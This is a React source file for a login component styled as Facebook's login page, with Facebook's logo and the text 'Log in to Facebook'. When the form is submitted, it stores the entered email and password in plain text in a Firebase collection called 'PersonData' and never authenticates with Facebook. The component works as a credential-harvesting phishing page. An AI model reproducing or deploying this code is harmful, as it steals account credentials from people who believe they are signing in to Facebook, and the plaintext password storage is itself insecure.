import { React, useState } from 'react';
import db from './Firebase';
import './Login.css';
import { actionTypes } from './reducer';
import { useStatevalue } from './StateProvider';

function Login() {

    const [state, dispatch] = useStatevalue();
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");

    const sendData = (e) => {
        // e.preventDefault();

        db.collection("PersonData").add({
            Usermail: email,
            Userpassword: password,
        })
            .then((result) => {

                dispatch({
                    type: actionTypes.SET_USER,
                    user: result.user,
                })

                console.log(result);
            })
            .catch((error) => {
                console.log(error.message);
            })

    }

    return (
        <>
            <div className="img">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
            </div>
            <div className="container">
                <p>Log in to Facebook</p>
                <form>
                    <input className="input" placeholder="Email address or phone number" type="text" id="email" onChange={(e) => setEmail(e.target.value)} />
                    <input className="input" placeholder="Password" type="password" id="password" onChange={(e) => setPassword(e.target.value)} />
                    <button className="button" onClick={sendData}>
                        Log In
        </button>
                </form>
            </div>
        </>
    );
}

export default Login;
